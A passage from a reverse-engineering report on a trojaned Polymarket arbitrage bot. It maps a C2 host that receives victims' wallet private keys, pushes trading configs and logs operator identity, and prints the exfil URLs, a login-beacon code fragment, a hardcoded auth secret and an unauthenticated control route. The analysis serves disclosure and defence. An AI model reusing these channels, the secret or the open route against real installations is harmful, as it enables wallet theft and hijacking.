Sibling clones at `0xe87fd` (feeds 0xf08f0) and `0x10e6ed` (feeds
0x1167e0) — one per wallet monomorphization.

`run_trading_loop` and `run_spread_capture_loop` read target_spread
from their closure captures at `[rbp+0x78]` (first clone), sibling
clones at 0xf73d6, 0x11d2c6 (trading_loop) and 0xf0998, 0x116888
(spread_capture_loop). Values are propagated into:

- `tokio::task::spawn`'s task-state at `rsp+0x438` (just before
  0xa24bc in trading_loop)
- `run_side_capture`'s per-side future state (malloc'd 0x70-byte
  struct) at its `self+0x28` (written at 0x97b34 inside
  run_spread_capture_loop prelude)

### Runtime consumer: run_side_capture's spread-vs-target gate

The actual comparison `current_spread` vs `target_spread` lives
inside `run_side_capture` at the captured `self+0x28` slot, not
via any fresh Arc load. No `[rax+0xc0]` read occurs anywhere in
the binary OUTSIDE the three prelude sites above, which confirms
target_spread is captured-by-value into the async future and all
downstream reads go through the capture.

Semantic role: `target_spread` is the **spread_capture strategy's
goal spread** — the spread value the bot aims to maintain on its
quoted book. Distinct from `spread_threshold` (trigger to quote)
and `edge_threshold` (dutch_book edge gate). When `current_spread`
is close to `target_spread`, the bot holds; when the book widens
beyond `target_spread`, it posts buys on both sides to tighten it
(spread_capture strategy logic per banner).

### Clean-clone implication

`target_spread: f64` (default 0.01) is a real knob for the
spread_capture strategy. Keep it, expose it in your config.

## 25. Orchestration above run_single_market — main() control flow

### main location and inlining

- Symbol `_ZN13arbitrage_bot4main17h76a8080217990620E` at file
  offset **0x1672c0** (size 0xd84, 3460 bytes). C `main` at
  0x166930 is a `lang_start` stub.
- Body is tokio runtime bootstrap: `Builder::build` (0x16744b),
  `enter_runtime` (0x1675f1), `CachedParkThread::block_on`
  (0x16789b). The real async `main::{{closure}}` is driven here.

### LTO-inlined 3× by wallet type

The async main body has been LTO-inlined into **three host
functions**, one per `TradingClient` wallet monomorphization:

| Body start | Host symbol                                      | run_single_market variant | Wallet type          |
|------------|--------------------------------------------------|---------------------------|----------------------|
| 0x108600   | `CachedParkThread::block_on::{closure}.bee`      | .4141 @ 0x10c040          | EOA                  |
| 0x198440   | `std::thread::local::LocalKey::with::{closure}`  | base   @ 0x89670          | Gnosis Safe / Rabby  |
| 0x19c160   | `tokio::runtime::context::runtime::enter_runtime`| .3940  @ 0xe6150          | Poly Proxy / Magic   |

Wallet strings in rodata 0x6db0.. block:
`"Using EOA wallet"`, `"Using Gnosis Safe wallet (MetaMask / Rabby)"`,
`"Using Poly Proxy wallet (Magic Link)"`. Selection is by the
`WALLET_TYPE` env var at TradingClient::new time — only one of the
three closures executes per process.

### main flow (observed at 0x108d51..0x10acc2)

1. **CLI parse** — `Args::detect_explicit_args` at 0x108d51
   (clap). Flags: `--config`, `--symbol`, `--interval-minutes`,
   `--spread-threshold`, `--max-buy-order-size`, `--dry-run`,
   `--no-cancel-orders-on-start` (rodata cluster @ 0x6dce20).

2. **Config load** — `BotConfig::load_from_file` at 0x108f02.
   Opens the path via `std::fs::read_to_string`, parses with
   **`serde_json::Deserializer`** (despite `.toml` substring
   appearing in shared rodata — the real parser is JSON).

3. **Merge CLI over JSON** — `BotConfig::merge_with_args` at
   0x108f6d.

4. **Banner print** — 10+ `std::io::_print` calls at
   0x1092d7..0x109b92 producing the ARBIGAB BOT banner
   (rodata 0x6db98c).

5. **Pre-window run** — **first** `run_single_market` call at
   0x10a099. This is the warm-up invocation before the market
   window opens.

6. **Wait for window** — `chrono::Utc::now()` (0x10a7dc) +
   `market::time::generate_slug` (0x10a8a8) compute the next
   window slug. Then print `"⏳ Waiting for market … to exist…"`
   and sleep via `tokio::time::sleep::Sleep` (two Sleep fields
   visible in the closure's drop_in_place at 0xe5fae/0xe5fc8).

7. **In-window run** — **second** `run_single_market` call at
   0x10acc2 — the real trading call.

### Key properties

- **No multi-market loop.** Each process invocation trades a
  single market (one `--symbol`). Multi-market coverage is
  achieved by running N separate bot processes.
- **No pre-flight HTTP before run_single_market** other than
  implicit clap/config file I/O. The gabagool exfil fires INSIDE
  `run_single_market` via `TradingClient::new`.
- **Two-shot pattern** (warm-up + real) rather than continuous
  loop. Time scheduling uses `generate_slug` / `is_in_window` /
  `get_window_start_from_slug` / `get_window_end_from_slug`
  (offsets 0x17ff40 / 0x181220 / 0x180440 / 0x180e40) all
  operating on the slug-string alone — no external time server.

### Exhaustive URL audit (CONFIRMS: gabagool22.com is the SOLE exfil)

| rodata offset | URL                                                          | purpose                          |
|---------------|--------------------------------------------------------------|----------------------------------|
| **0x6daa09**  | **https://gabagool22.com/api/verify-balancing-conf**         | **EXFIL (§21)**                  |
| 0x6daa39      | `auth/api-key` (relative)                                    | Polymarket CLOB auth             |
| 0x6daa45      | `auth/derive-api-key` (relative)                             | Polymarket CLOB auth             |
| 0x6daa58      | `data/orders` (relative)                                     | Polymarket CLOB orders           |
| 0x6daced      | https://clob.polymarket.com/auth/derive-api-key              | Polymarket CLOB (legit)          |
| 0x6dad5a      | https://clob.polymarket.com/auth/api-key                     | Polymarket CLOB (legit)          |
| 0x6db0b5      | https://clob.polymarket.com                                  | Polymarket CLOB base (legit)     |
| 0x6dade0      | https://gamma-api.polymarket.com/markets/slug/               | Polymarket Gamma (legit)         |
| 0x6dae55      | https://gamma-api.polymarket.com/events?slug=                | Polymarket Gamma (legit)         |
| 0x6d9b1a      | wss://ws-subscriptions-clob.polymarket.com/ws/user           | Polymarket WS user (legit)       |
| 0x6db2c3      | wss://ws-subscriptions-clob.polymarket.com/ws/market         | Polymarket WS market (legit)     |
| 0x736ae9      | https://polymarket.com                                       | static User-Agent/Origin constant|

**No second exfil channel exists.** No DNS-over-HTTPS endpoints,
no IP-literal URLs, no alternative domains. The binary's
attack-surface outbound reduces to:

1. **gabagool22.com** — the trojan. Patchable via §21's one-byte
   rodata neutralisation.
2. **clob.polymarket.com / gamma-api.polymarket.com / ws-subscriptions-clob.polymarket.com** — legitimate Polymarket APIs.

### Clean-clone implication

- `main` is trivial: CLI parse → config load → banner → two-shot
  run_single_market. Reimplement in ~30 LoC.
- Drop the `WALLET_TYPE` dispatch unless supporting multiple
  wallets is a goal — pick one wallet backend, delete the other
  two monomorphizations.
- The two-shot warm-up-then-real pattern is unusual. In the clone
  either skip the warm-up entirely (always wait for window) or
  make it an explicit `--pre-window` CLI flag instead of
  hard-coded.

## 26. String fields — handlers pinned, offsets still TBD

`trade_side` and friends are confirmed `String` in the deserializer
but their in-struct offsets are not yet pinned. The §24 stash-block
offset-math is f64-specific (`movsd` → stack stash → `memcpy`); the
`String::deserialize` path writes a 24-byte `(ptr,len,cap)` triple
via a different instruction sequence that has not been decoded.

| field          | handler addr       | length / match      | default  | known runtime use                                           |
|----------------|--------------------|---------------------|----------|-------------------------------------------------------------|
| slug           | 0x15ece1           | len 4               | ""       | appears at state+0x60 in run_side_capture; market time      |
| symbol         | 0x15f0a8           | len 6               | ""       | banner; single-market CLI `--symbol`                        |
| strategy       | 0x15f340           | len 8               | ""       | dispatch `trading_loop` vs `spread_capture` (§0)            |
| trade_side     | 0x15ef76           | len 10 (8+2 XOR)    | "up"     | `trade_side.to_lowercase() ∈ {"no","down"}` → is_bearish   |
| current_market | (len-14 handler)   | len 14              | ""       | `polymarket_ws::subscribe(&cfg.current_market)` (§22e)      |

**Proof points:**
- rodata `"trade_side"` @ `0x6dca74` (10 bytes).
- `arbitrage_bot::config::default_trade_side` @ `0x176fc0` allocates
  2 bytes and emits `movw $0x7075, (%rax)` (ASCII `"up"`), proving
  both the type (`String`) and the literal default.
- No `is_bearish` literal exists anywhere in `.rodata` or in the
  demangled symbol table — confirming that `is_bearish` is NOT a
  BotConfig field. It is a **local `bool`** derived per dispatch at
  run_single_market's `strategy == "spread_capture"` branch:

  ```rust
  let is_bearish = matches!(
      cfg.trade_side.to_lowercase().as_str(),
      "no" | "down"
  );
  run_spread_capture_loop(cfg, client, is_bearish).await
  ```

  This supersedes any earlier wording in §0/§3 that called
  `is_bearish` a BotConfig field.

**Next step to pin the offsets:** trace the `String::deserialize`
return path — look for a 24-byte copy (`movdqu`+`mov`) from the
per-field stack landing zone into `[rbx + ...]` within the same
`deserialize_struct` frame that owns the f64 stash-block at
`0x160c00..0x161004`. Each String field will write 24 bytes at its
own offset; cross-checking between the five handlers above should
let all five offsets fall out in one pass.

## 27. gabagool22.com is a live C2 layer, not a passive exfil

§21 pinned the Rust `TradingClient::new` one-shot credential POST
to gabagool22.com (wallet-key harvest at bot startup). The Next.js
dashboard adds **two more** channels to the same host. This
section maps all three and refines the attacker-capability model.

### 27a. Channel inventory

| # | Layer      | Code                                                                   | Direction | Trigger              | Payload                  |
|---|------------|------------------------------------------------------------------------|-----------|----------------------|--------------------------|
| 1 | Rust       | `TradingClient::new` (§21)                                             | →         | Bot process start    | wallet privkey + API keys |
| 2 | Dashboard  | `bot/web/.next/server/instrumentation.js`                              | ←         | Web server boot (if DB empty) | GET — seeds `BotConfiguration` |
| 3 | Dashboard  | `bot/web/.next/server/app/api/configurations/refresh-official/route.js`| ←         | User clicks "Refresh official configs" | deletes + re-GETs |
| 4 | Dashboard  | `bot/web/.next/server/app/api/auth/login/route.js`                     | →         | Every dashboard login | `{email, orderId}` → `/api/auth` |

Channels 2+3 pull attacker-controlled data; channel 4 beacons
operator identity; channel 1 extracts wallet secrets.

### 27b. Host resolution

All four call sites resolve the host identically:

```
process.env.GABAGOOL_API_URL || "https://gabagool22.com"
```

So an operator who knows about the backdoor can partially
neutralise it by setting `GABAGOOL_API_URL=http://127.0.0.1:1`
before starting the dashboard. That shuts channels 2, 3, 4 but
does **not** neuter channel 1 — the Rust binary uses a separate
rodata string constant with no env override. Bypassing channel 1
requires the one-byte rodata patch described in §21.

### 27c. `/api/official-configs` response shape (decoded)

From `instrumentation.js` and `refresh-official/route.js` both
mapping the same JSON response. The endpoint returns an array of
objects whose fields are whitelist-copied into
`botConfiguration.create`:

| JSON field               | DB column               | default (if missing) |
|--------------------------|-------------------------|---------------------|
| `name`                   | `name`                  | (required)          |
| `symbol`                 | `symbol`                | `"btc"`             |
| `slug`                   | `slug`                  | `null`              |
| `interval_minutes`       | `intervalMinutes`       | `15`                |
| `dry_run`                | `dryRun`                | `false`             |
| `max_buy_order_size`     | `maxBuyOrderSize`       | `5`                 |
| `spread_threshold`       | `spreadThreshold`       | `0.02`              |
| `trade_cooldown`         | `tradeCooldown`         | `5000`              |
| `balance_factor`         | `balanceFactor`         | `0`                 |
| `current_market`         | `currentMarket` (bool)  | `false`             |
| `log_price`              | `logPrice`              | `true`              |
| `stop_before_end_ms`     | `stopBeforeEndMs`       | `0`                 |
| `min_price`              | `minPrice`              | `0`                 |
| `max_price`              | `maxPrice`              | `1`                 |
| `cancel_orders_on_start` | `cancelOrdersOnStart`   | `true`              |

**Attacker capability via this channel**: pick which market, when
(interval + stop_before_end_ms), how much (max_buy_order_size),
how hard (balance_factor), and all the visible safety flags
(dry_run, log_price, cancel_orders_on_start). That's substantial
steering power for copy-trade or liquidity-direction purposes.

**Fields NOT in the response** (attacker cannot push these):
`trade_side`, `strategy`, `enable_gamble`, `spread_reducer_value`,
`spread_reducer_probability`, `edge_threshold`, `max_position_size`,
`inventory_skew`, `refresh_interval_ms`, `order_size`,
`target_spread`. The two most dangerous gambling/manipulation
layers (`enable_gamble` and the reducer) are **not remotely
controllable** — they require operator-edited local config.

### 27d. Templates vs. running instances — why `tradeSide` is still operator-picked

`BotConfiguration` rows (seeded from gabagool22) are **templates**,
not running orders. The Prisma model is two-tiered:

```
BotConfiguration (template, type: "official" | "custom")
    ↑ referenced by
MarketNode (a concrete running instance, has its own tradeSide)
    ↑ wraps
BotNode (the spawned Rust child process state)
```

To actually run a bot, the operator must create a `MarketNode`
via `POST /api/workspaces/[id]/market-nodes`, choosing a
`BotConfiguration` and explicitly setting `tradeSide` (default
`"up"` from Prisma's `@default`). The attacker-pushed official
configs don't auto-start anything. This closes the "could
gabagool22 flip direction live?" question: **no, not via
`/api/official-configs`.**

The only direction-flip path is `PUT /api/market-nodes/[nodeId]`
which is unauthenticated (§22 dashboard audit), so a remote
caller who knows the dashboard's public URL + a valid node ID
could flip `tradeSide`. But gabagool22 does not make such
calls from anywhere in the bundle; channel 2 uses GET, channel
3 uses GET, channel 4 POSTs to `/api/auth`.

### 27e. `/api/auth` login beacon

`bot/web/.next/server/app/api/auth/login/route.js`:

```js
// GABAGOOL_API_URL || "https://gabagool22.com"
// AUTH_TOKEN_SECRET || "gbgl-arb-s3cr3t-k3y-2026"   ← hardcoded fallback
POST `${GABAGOOL_API_URL}/api/auth`
    body: { email, orderId }
    timeout: 10s
→ on 200: HMAC-SHA256 a local token with AUTH_TOKEN_SECRET,
   store userEmail in SQLite, return Set-Cookie
→ on non-200: login fails
```

Two consequences:

1. **Every login is a liveness ping** to gabagool22.com carrying
   the operator's identity (`email`) and purchase linkage
   (`orderId` from whatever sales page onboards them). Attacker
   knows exactly who is running which installation.
2. **If gabagool22.com goes offline, nobody can log in** — it's a
   hard dependency. The dashboard's "license" gate is a remote
   kill-switch, not a local check.

The hardcoded HMAC fallback `"gbgl-arb-s3cr3t-k3y-2026"` is a
local-secret-in-code anti-pattern: anyone who reads the bundle
can forge their own cookies without hitting `/api/auth`. But
that only bypasses the gate; the beacon still fires on the
server first.

### 27f. Combined attacker capability

Putting channels 1-4 together, the gabagool22.com operator has:

- **(1)** Private key of every victim wallet → can drain on demand
- **(2+3)** Live control of the market/size/schedule menu on every
  dashboard → can redirect liquidity, push into thin markets
- **(4)** Identity+purchase linkage of every user → knows who, when,
  and what they paid for the tool

What they **do not** have (via these channels alone):
- Remote `tradeSide` flip (the unauthenticated
  `PUT /api/market-nodes` route is exploitable but not used by
  the C2)
- Remote `enable_gamble` / spread-reducer toggle (these stay
  local)
- Automatic copy-trade telemetry — no per-order POST beacons

### 27g. Clean-clone requirements (update to §7 / §22)

Earlier clean-clone notes called for removing `enable_gamble`,
the size-randomiser, and the §21 exfil. With §27, the list is:

1. **Rust**: §21 credential POST in `TradingClient::new`
2. **Rust**: §5/§10 spread-reducer inflation (gated by
   `enable_gamble`)
3. **Rust**: §3 two-roll size randomisation
4. **Rust**: §15 5.0-size dry-run loophole
5. **Dashboard**: `instrumentation.js` — replace the
   `gabagool22.com` fetch with a local-file seed or empty-DB-is-OK
6. **Dashboard**: `refresh-official/route.js` — delete the
   endpoint entirely
7. **Dashboard**: `auth/login/route.js` — replace the
   `${GABAGOOL_API_URL}/api/auth` call with a purely local
   credential check; delete the `gbgl-arb-s3cr3t-k3y-2026`
   fallback and require `AUTH_TOKEN_SECRET` be set
8. **Dashboard**: add auth middleware to `/api/market-nodes/*`,
   `/api/bots/*`, `/api/configurations/*`, `/api/settings/*`
   (currently all unauthenticated per earlier audit)

After those 8 edits, the tool runs the same strategy without
the C2 surveillance, the wallet-key theft, the manipulation
layers, and the trivially-exploitable dashboard routes.

## 28. Hidden-loop final decode — corrections to §6 and §24

Parallel agent audits of `run_spread_capture_loop` (0x97950) and
`run_side_capture` (0xd9e90) forced **three corrections** to the
earlier hypothesised semantics. The hidden strategy is simpler,
narrower, and cleaner than the dutch_book path — and some
knobs previously assumed live are dead.

### 28a. `enable_gamble` is dutch_book-only (dead in spread_capture)

Propagation evidence for the reducer's runtime byte at
`run_trading_loop::self+0x150`:

```
0x9f04e: movupd 0xa0(%r15), %xmm0     ; load BotConfig+0xa0..0xb0
0x9f057: movupd %xmm0, 0x150(%r15)    ; store into self+0x150
         (triplicated at 0xf7447, 0x11d337 per wallet monomorph)
0xc1a1f: cmpb $0x0, 0x150(%rcx)       ; §10 gate
0xc1aa3: addpd %xmm0, %xmm1           ; the only `addpd` in .text
                                      ; that touches bid-pair
```

**`addpd` count across the entire `.text`: three total.** One at
`0xc1aa3` (reducer). The other two at `0x48b361` and `0x48b3bd`
are inside `strsim::jaro` (third-party crate — unrelated).

**No equivalent mirror copy exists for spread_capture.**
`run_single_market` (all three monomorphs 0x89670, 0xe6150,
0x10c040) performs no byte or SSE read from `0xa0(%state)` into
any spread_capture sub-future. Inside `run_spread_capture_loop`
and `run_side_capture`, not a single `cmpb $0x0, 0x150(%reg)` or
`testb` on `0xa0(%state)` exists.

**Reducer log string `"🎲 Spread reducer triggered!"`** at
`0x6d9823`, format-args metadata at `0x6d9870`. The **only** LEA
to `0x6d9870` in the whole binary is at `0xc1b23` (inside
run_trading_loop). Zero hits from 0x97950..0x9e38d or
0xd9e90..0xe197c.

**Submit-path segregation confirms §15's pin**:

| call target                          | call sites                                   |
|--------------------------------------|----------------------------------------------|
| `place_batch_buy_orders` @ 0xc5390   | only `0xc1df0` (run_trading_loop)            |
| `place_single_order` @ 0xe1a10       | `0xde754` + `0xdf7fd` (run_side_capture)     |

So the §3 two-roll `gen_range` size-randomisation (0xc7931 /
0xc795e, inside place_batch_buy_orders) is also **dutch_book-only**.
spread_capture posts single orders at deterministic sizes.

**30-second answer**: in `strategy=="spread_capture"`, flipping
`enable_gamble=true` or `false` produces **zero observable
difference**. Dead weight. Leave it `false` in clean clones.

### 28b. `run_spread_capture_loop` is a ONE-SIDED BUY-ONLY accumulator

§6 originally framed this as "market-maker quoting both sides."
That is **wrong.** Pinned evidence:

```
0xdf7da: mov WORD PTR [rbx+0x2eb], 0x100
         ; writes Side=Buy (0x00) and OrderType byte (0x01)
         ; the Side byte is HARDCODED — no conditional store
         ; of 0x01 to [rbx+0x2eb] exists in 0xd9e90..0xe197c
0xe08ea..0xe08ef: literal bytes 0x62 0x75 0x79  = "buy"
         ; written into the order-tag heap string
         ; no "sell" literal appears in the function
0xe01ae: call cancel_orders
         ; operates on Vec<OrderId>, NOT a sell replacement
```

Semantics: each cycle, the loop picks a side (YES or NO token —
see §28e) and **buys more of it** until `max_position_size` caps
the position. Exits are driven by cancellations from outside the
loop, not by the loop itself. The "spread_capture" name is
misleading — there is no two-sided book quoting.

### 28c. `target_spread` is a dead capture (correction to §24)

§24 claimed target_spread is captured into the sub-future at
`self+0x28` and consumed as a gate. The "consumed" claim is
**incorrect.**

Re-audit trace:

```
0x8bd1d: movsd xmm0, [rax+0xc0]   ; read BotConfig+0xb0 target_spread
0x97b34: movsd [rbx+0x28], xmm0   ; store into sub-future self+0x28
                                   ; (YES, captured by value)

; Inside run_side_capture (0xd9e90..0xe197c):
grep -c 'mov.*0x28\(%rbp\)'    →  reads exist
grep -c 'mov.*0x28\(%rsp\)'    →  reads exist
grep -c 'ucomisd.*0x28(%...)'  →  0 inside the sub-future slot

; The ONE read that looks like target_spread usage:
0xdf0ac: mov 0x60(%rbx), %rax     ; rax = &BotConfig  (§11a)
0xdf0b1: movsd xmm0, [rax+0x28]   ; xmm0 = edge_threshold (BotConfig+0x28)
0xdf0b5: ucomisd xmm1, xmm0       ; spread vs edge_threshold
                                   ; this is the §11a edge gate — NOT target_spread
```

There is no `[rbx+0x28]` or `[self+0x28]` read that treats the
value as an f64 comparand anywhere in the hidden loop. The field
is captured, propagated through the tokio state machine, and
**never consulted.** Vestigial — probably a planned feature that
didn't ship, or a refactor leftover.

**Clean-clone implication**: target_spread can be dropped from
the config entirely. Setting it doesn't affect bot behavior.

### 28d. No time-left stop inside `run_spread_capture_loop`

`stop_before_end_ms` is a `BotConfig` field documented in §22e.
The "Only Xs until window end, stopping early" log string lives
at `0x6d9b07`. The **only** LEA to that address is at `0xb6088`
— inside `run_user_ws_monitor` (0xb5f50..0xc020f), a different
function altogether.

- No `chrono::Utc::now()` call inside 0x97950..0x9e38d or
  0xd9e90..0xe197c
- No `SystemTime` reference
- No "window_end" / "stop_before_end_ms" consumer in the loop
- `utils::now_str` (0x170e20) is called from `0xe1a9f` only, for
  the `[SIM]` log-line timestamp

So the hidden loop has **no graceful-shutdown gate**. It runs
until cancelled from above (by `main`'s two-shot sequencing per
§25) or until the WS connection dies. The `stop_before_end_ms`
field is only honored by `run_trading_loop` (dutch_book).

### 28e. `is_bearish` picks the TOKEN, not the direction

§6's original framing treated `is_bearish` as a directional lean.
The actual runtime effect is narrower:

- `is_bearish` (derived from `trade_side.to_lowercase() ∈
  {"no","down"}`, see §0) is passed as an arg to
  `run_spread_capture_loop`.
- At `0xd9ede`, the spawning code reads it from `+0x258` of the
  parent arg pack and stores it as a byte at `rbx+0x25a` in the
  run_side_capture state.
- Three token-slot selectors then use that byte:

```
0xdefef: movzbl 0x25a(%rbx), %eax
         shl $5, %eax           ; × 32 (each asset row = 32 B)
         ; used to offset into the YES/NO asset metadata table
0xe04a9: (same pattern)
0xe071a: (same pattern)
0xdf5d7: (same pattern, but indexing the position-slot pair)
```

So `is_bearish` selects **which 32-byte asset record** (YES vs NO
outcome token) to accumulate, and **which position slot**
(state+0x80 for UP vs state+0xa0 for DOWN, per §11b) the
max_position_size gate reads. **`Side` is always Buy regardless.**

| `trade_side` | `is_bearish` | token bought | position slot checked |
|--------------|--------------|--------------|----------------------|
| `"up"`/`"yes"`/""/anything-else | false | YES outcome | `state+0x80` (UP)   |
| `"down"`/`"no"`                 | true  | NO outcome  | `state+0xa0` (DOWN) |

### 28f. Buy-gate checklist (pinned, replaces the §6 / §11a sketches)

Each book tick inside `run_side_capture` evaluates in order:

| # | addr     | gate                                                         |
|---|----------|--------------------------------------------------------------|
| 1 | 0xdf072  | `bid > 0`                                                    |
| 2 | 0xdf086  | `ask > 0`                                                    |
| 3 | 0xdf09c  | compute `spread = ask - bid`, cache at `rbx+0x208`           |
| 4 | 0xdf0b1  | `edge_threshold ≤ spread` (else skip; log if `log_price`)    |
| 5 | 0xdf5ca  | `get_position()` syscall                                     |
| 6 | 0xdf5d7  | pick UP-or-DOWN position slot via `rbx+0x25a`                |
| 7 | 0xdf5f0  | `position < max_position_size` (else skip)                   |
| 8 | 0xdf7da  | write Side=Buy / OrderType to order tag                      |
| 9 | 0xdf7fd  | call `place_single_order`                                    |
|10 | 0xe1a8e  | **inside place_single_order**: if `size < 5.0`, log-sim only |
|11 | 0xe1c13  | else: real CLOB POST                                         |

### 28g. State-table stubs (jumptables located)

Three jumptables found, all in `.rodata`:

| jumptable VA | indexed by            | states decoded | notes                   |
|--------------|------------------------|----------------|-------------------------|
| `0x7cbe38`   | `BYTE [self+0x621]`    | 0..9 valid     | outer spread_capture loop; slots 10+ misalign |
| `0x7cb914`   | `BYTE [self+0x259]`    | 0..6 valid     | side dispatcher; 13..27 misread |
| `0x7cb9a0`   | `BYTE [self+0x40]`     | —              | inner closure dispatch  |

The smaller-than-expected valid-state count (≤10 vs the ~28
estimated from §0) suggests the loop is substantially simpler
than run_trading_loop's 28-state machine. Consistent with the
buy-only-accumulator framing: fewer message types, fewer
stateful transitions.

### 28h. Rolled-up verdict on the hidden strategy

After §28a-g:

- **What it does**: accumulate one side (YES or NO) of a
  Polymarket outcome whenever `spread ≥ edge_threshold` and
  `position < max_position_size`, at a fixed market-making size
  (the `order_size` / `max_buy_order_size` dials).
- **What it doesn't do**: quote both sides. Price-inflate.
  Size-randomise. Gate on `target_spread`. Gate on
  `stop_before_end_ms`. Read `enable_gamble`.
- **Cleanliness differential**: the hidden strategy is
  **materially cleaner than the public one**. No reducer, no
  randomiser, no inflation. An ethically-cloned bot could keep
  spread_capture largely as-is and discard most of §7's
  "dangerous parts" list — those all sit on the dutch_book side.

### 28i. Config-field liveness summary (spread_capture only)

Combining §28 with §22e / §23 / §24:

| field                          | live in spread_capture? |
|--------------------------------|-------------------------|
| `trade_side` → `is_bearish`    | YES — picks token slot  |
| `edge_threshold`               | YES — §28f gate #4      |
| `max_position_size`            | YES — §28f gate #7      |
| `max_buy_order_size`           | YES — size of each buy  |
| `log_price`                    | YES — §11a log gate     |
| `interval_minutes`, `slug`, `symbol`, `current_market` | YES — market selection |
| `cancel_orders_on_start`       | YES (§11c, loop-agnostic) |
| `dry_run` (config bool)        | NO runtime effect — §15's 5.0 size gate is the real sim gate |
| `enable_gamble`                | **NO — §28a**           |
| `spread_reducer_value`         | **NO — §28a**           |
| `spread_reducer_probability`   | **NO — §28a**           |
| `target_spread`                | **NO — §28c (dead)**    |
| `stop_before_end_ms`           | **NO — §28d**           |
| `spread_threshold`             | TBD — name suggests live here, but no 0x?? offset pinned yet |
| `order_size`                   | TBD — possibly distinct from max_buy_order_size |
| `inventory_skew`               | NO in this loop — §3 is dutch_book-only (single-side, no delta skew) |
| `refresh_interval_ms`          | TBD — no explicit `tokio::sleep` pin inside side_capture yet |
| `trade_cooldown`               | TBD                     |
| `balance_factor`               | NO runtime effect — §2 confirms banner-only  |
| `min_price` / `max_price`      | TBD — likely filters best_bid/best_ask before the edge gate |

---

## 29. On-chain wallet correlation (external evidence)

External analysis of two reference wallets provides the strongest
corroboration so far for the decoded strategy, and forces one
important structural refinement.

### 29a. Wallet identifiers

- `stingo`: `0x0006af12cd4dacc450836a0e1ec6ce47365d8c63`
  — alleged original seller of the "arbigab" bot.
- `not stingo`: `0xb27bc932bf8110d8f78e55da7d5f0497a18b5b82`
  — observed active operator with a behavioural profile very close
  to the decoded binary.

### 29b. Profile of `not stingo` (11-market block)

Observed from public fills / merges / redeems:

- **Asset**: BTC only.
- **Timeframe**: 5-minute markets only.
- **Entry**: first fill ~285–290 s before expiry (near market open).
- **Engagement**: ~242 s average active span on the 300 s window.
- **Both-sided**: 11/11 markets show fills on *both* YES and NO tokens.
- **Fill volume**: mean 282 fills / market, range 186–452.
- **Burst execution**: mean 18.7 same-second fills at burst peaks
  (not a uniform 1-per-second cadence).
- **Switch rate**: ~13–14 % at trade level → blocks of ~7–8 same-side
  fills before rotating.
- **Imbalance convergence**: |Up−Down|/(Up+Down) trajectory
  0.319 (Q1) → 0.111 (mid) → 0.035 (final); 11/11 improved post-Q1.
- **`lock_sum` convergence**: avg_up + avg_down on paired inventory
  1.011 (Q1) → 0.990 (mid) → 1.007 (final); 11/11 reached **sub-1.00
  lock_sum at some point after Q1** (mean best = 0.9298).
- **Merge / redeem**: systematic, not incidental.

### 29c. Reconciliation with §28 — the dual-MarketNode hypothesis

§28 proved `run_spread_capture_loop` is **one-sided** per
`MarketNode` (Side=Buy hardcoded at `0xdf7da`, `is_bearish` picks
YES-vs-NO token slot but not direction). The wallet evidence says
behaviour at the address level is unambiguously **two-sided on every
market**. The only binary-consistent explanation:

> The operator runs **two `MarketNode` instances per market** —
> one `BotConfiguration` with `trade_side = "up"` (buys YES), one
> with `trade_side = "down"` (buys NO). Each node independently
> runs `spread_capture`. The wallet-level behaviour is the
> **superposition** of the two one-sided accumulators.

Why this is forced:

- The `BotConfiguration` table (§13) is a per-market template, and
  two rows can point at the same `current_market`/`slug` with
  opposite `trade_side` at zero extra engineering cost.
- The dashboard explicitly supports multi-row templates per market.
- `is_bearish` determines only which side of `market.tokens[]` the
  node reads — it does not flip `Side` at runtime (§28e).
- `MarketNode::run_spread_capture_loop` never yields a `Sell`
  pathway and never re-reads `trade_side` mid-loop.

### 29d. `edge_threshold` is the dutch-book trigger

The TG analysis measured `lock_sum = avg_up + avg_down < 1.00` in
every market — this is the textbook dutch-book edge condition:

    ask_YES + ask_NO < 1.00   →   buy both, collect $1.00 at merge

Pinned in §28f gate #4: `run_spread_capture_loop` reads
`BotConfig+0x28` ("edge threshold") at `0xdf0ac` and refuses to
buy unless the observed spread / edge clears it. With **both** legs
running, each leg's buy-gate fires whenever its own ask drops
enough that the cross-leg sum is < `1.0 − edge_threshold`. No
explicit "sum < 1" check is needed in the binary — it emerges
automatically from two independent single-side edge gates.

### 29e. Imbalance convergence is liquidity-constrained, not logic-constrained

The TG bot observed `|Up−Down|/(Up+Down)` converging to ~0 in 11/11
markets and worried this implied an active rebalancer. §28 shows
there is **no rebalancer in the binary** — each node greedily fills
its own leg at fixed `max_buy_order_size` whenever the edge gate
passes. Convergence to zero falls out of:

1. both legs firing whenever `ask_YES + ask_NO < 1 − edge_threshold`,
2. both using the same `max_buy_order_size`,
3. one side pausing when its local ask rises (other keeps firing),
4. eventually the slow side catches up as its ask re-enters range.

The `block runs of ~7–8 fills` and `switch rate 13–14 %` are then
**microstructural** — whichever side has fresh asks posted wins the
next burst. No inventory-imbalance controller needed. The §28
"materially cleaner than public" verdict stands: the cleanliness is
doing the work, not an added rebalancer.

### 29f. `lock_sum > 1 late` ≠ bug — matches §28d

The TG bot flagged that `lock_sum` often **drifts back above 1.00**
near market close even after reaching sub-1.00 mid-market. §28d
predicted this exactly: `run_spread_capture_loop` has **no
`stop_before_end_ms` check and no profit-take branch** — it keeps
running until the `interval_minutes` top-of-loop exits. So the
bot cheerfully keeps accumulating at worsening prices in the last
seconds, because no code path tells it to stop at a profitable
point. This is consistent with §22's note that late-market fills
are one of the dangerous behaviours a clean clone should fix.

### 29g. Merge / redeem as lifecycle, not cleanup

The CTF merge call (burn 1 YES + 1 NO, receive 1 collateral)
converts a hedged pair into a guaranteed $1 payout. With the
dual-MarketNode structure:

- paired inventory accumulates throughout the window,
- merge burns matched pairs into USDC collateral,
- residual one-sided inventory from the late-window drift (§29f)
  gets redeemed at resolution.

This is visible in the binary under the Polymarket CTF adapter
calls (not fully decoded yet but labelled in the dashboard's
transaction logs). The merge call is the **realisation step** of
the dutch-book edge — without it, the bot holds two matched tokens
that each resolve at $0 or $1 independently.

### 29h. `stingo` vs `not stingo` divergence (hypothesis)

The seller wallet (`stingo`) apparently **does not** match the
`not stingo` profile as cleanly — TG analysis suggests delayed
entries / non-two-sided fills / different market selection. Most
plausible explanations:

1. `stingo` ran an older build (pre-dual-node dashboard support).
2. `stingo` sold the bot but kept running a **degraded or
   partial** version (e.g. single-node, public-config only).
3. `stingo` ran a different strategy (dutch_book `run_trading_loop`
   + `enable_gamble=true` would produce the "sporco" profile).

Option 3 is the sharpest: the public-facing `run_trading_loop`
path IS the dangerous/dirty one per §7, §22, §28. A seller
